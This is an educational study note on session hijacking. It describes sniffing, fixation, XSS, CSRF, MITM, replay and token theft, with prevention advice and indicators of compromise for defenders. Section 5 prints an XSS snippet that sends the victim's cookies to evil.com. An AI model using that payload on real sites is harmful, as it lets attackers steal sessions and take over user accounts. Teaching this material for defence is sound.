# Attack Techniques – Session Hijacking

## Overview

Session Hijacking attacks target an authenticated user's active session instead of stealing their username and password. Once the attacker obtains or manipulates the session identifier (Session ID, Cookie, or Token), the web server treats the attacker as the legitimate user.

---

# Session Hijacking Attack Flow

```
Victim Logs In
      │
      ▼
Server Creates Session
      │
      ▼
Session ID Generated
      │
      ▼
Browser Stores Cookie
      │
      ▼
Attacker Obtains Session ID
      │
      ▼
Attacker Sends Session ID
      │
      ▼
Server Authenticates Attacker
```

---

# 1. Session Sniffing

## Description

Session sniffing is the process of capturing session cookies or tokens from network traffic.

This usually occurs when:

- Website uses HTTP
- Traffic is unencrypted
- Public Wi-Fi
- Local network attacks

---

## Attack Workflow

```
Victim

↓

Logs into Website

↓

Cookie transmitted

↓

Attacker captures traffic

↓

Extracts Session Cookie

↓

Imports Cookie into Browser

↓

Account Compromised
```

---

## Common Tools

- Wireshark
- tcpdump
- Ettercap
- Bettercap

---

## MITRE Mapping

- Adversary-in-the-Middle
- Steal Web Session Cookie

---

## Prevention

- HTTPS
- Secure Cookies
- VPN
- HSTS

---

# 2. Session Sidejacking

## Description

Session Sidejacking is stealing authentication cookies over an insecure network.

Unlike credential theft, the attacker only needs the session cookie.

---

## Example

```
HTTP Request

Cookie:

PHPSESSID=6b39f1ea...
```

Attacker copies this cookie and gains access.

---

## Prevention

- HTTPS
- Secure Cookie Flag
- Cookie Encryption

---

# 3. Session Fixation

## Description

The attacker forces the victim to authenticate using a Session ID already known by the attacker.

---

## Attack Flow

```
Attacker creates Session

↓

Receives Session ID

↓

Sends Link to Victim

↓

Victim Logs In

↓

Server Associates Session

↓

Attacker Reuses Session
```

---

## Prevention

- Generate new Session ID after login
- Regenerate Session after privilege changes

---

# 4. Cookie Theft

## Description

The attacker steals cookies directly from the victim's browser.

---

## Methods

- XSS
- Malware
- Browser Extensions
- Physical Access
- Memory Dump

---

## Example

```
document.cookie
```

---

## Prevention

- HttpOnly Cookies
- XSS Protection
- Browser Hardening

---

# 5. Cross-Site Scripting (XSS)

## Description

JavaScript injected into a vulnerable page steals session cookies.

---

## Example

```
<script>
fetch("https://evil.com?cookie="+document.cookie);
</script>
```

---

## Prevention

- Input Validation
- Output Encoding
- Content Security Policy (CSP)
- HttpOnly Cookies

---

# 6. Cross-Site Request Forgery (CSRF)

## Description

An attacker tricks an authenticated user into submitting unwanted requests.

Unlike Session Hijacking, CSRF does **not** steal the session—it abuses the existing authenticated session.

---

## Example

Victim is logged into banking website.

Attacker sends malicious link.

Victim clicks.

Money transfer occurs automatically.

---

## Prevention

- CSRF Tokens
- SameSite Cookies
- Re-authentication
- CAPTCHA

---

# 7. Man-in-the-Middle (MITM)

## Description

The attacker intercepts communication between client and server.

---

## Attack Flow

```
Victim

↓

Attacker

↓

Web Server
```

Attacker can:

- Read traffic
- Modify traffic
- Capture Cookies
- Inject Scripts

---

## Common Techniques

- ARP Spoofing
- Rogue Wi-Fi
- Evil Twin
- DNS Spoofing

---

## Prevention

- HTTPS
- VPN
- Certificate Validation

---

# 8. Session Replay Attack

## Description

Previously captured authentication tokens are replayed later.

Common in APIs.

---

## Workflow

```
Capture Token

↓

Store Token

↓

Replay Request

↓

Access Granted
```

---

## Prevention

- Short Token Lifetime
- Nonce
- Timestamp Validation
- Token Rotation

---

# 9. Browser Malware

## Description

Malware installed on the victim's browser steals:

- Cookies
- Passwords
- Tokens
- Browser Sessions

---

## Examples

- Infostealers
- RedLine
- Raccoon
- Vidar

---

## Prevention

- Endpoint Protection
- Browser Updates
- MFA

---

# 10. Rogue Browser Extensions

## Description

Malicious browser extensions can access:

- Cookies
- Browsing History
- Session Tokens
- Credentials

---

## Prevention

- Install trusted extensions only
- Review permissions
- Regular audits

---

# 11. Token Theft (JWT)

Modern applications use JWT instead of traditional Session IDs.

Example

```
Authorization:

Bearer eyJhbGc...
```

If stolen, attackers can impersonate users until the token expires.

---

## Prevention

- Short Expiry
- Refresh Tokens
- Secure Storage
- HTTPS

---

# Real-World Examples

## Firesheep (2010)

- Firefox extension
- Captured Facebook session cookies over public Wi-Fi
- Demonstrated the importance of HTTPS

---

## Facebook Session Hijacking

Older versions of Facebook were vulnerable on HTTP networks.

Attackers could hijack user sessions using captured cookies.

---

## OWASP Top 10 Relevance

Session Hijacking is closely related to:

- Broken Access Control
- Identification and Authentication Failures
- Security Misconfiguration
- Cross-Site Scripting (XSS)

---

# Indicators of Compromise (IOC)

- Same Session ID used from multiple IP addresses
- Impossible travel events
- User-Agent changes during a session
- Long-lived sessions
- Concurrent logins with identical Session IDs
- Reuse of expired tokens
- Multiple failed requests followed by successful access

---

# Defensive Best Practices

- Enforce HTTPS
- Enable HSTS
- Use Secure Cookies
- Enable HttpOnly
- Configure SameSite
- Rotate Session IDs after login
- Implement MFA
- Limit Session Lifetime
- Monitor Session Anomalies
- Detect Impossible Travel
- Validate Device Fingerprints
- Log Authentication Events

---

# Key Takeaways

- Session Hijacking targets authenticated sessions instead of passwords.
- Cookies and tokens are primary targets.
- XSS, MITM, sniffing, and malware are common attack vectors.
- Secure session management is essential for protecting web applications.
- Continuous monitoring and anomaly detection are critical for SOC teams.
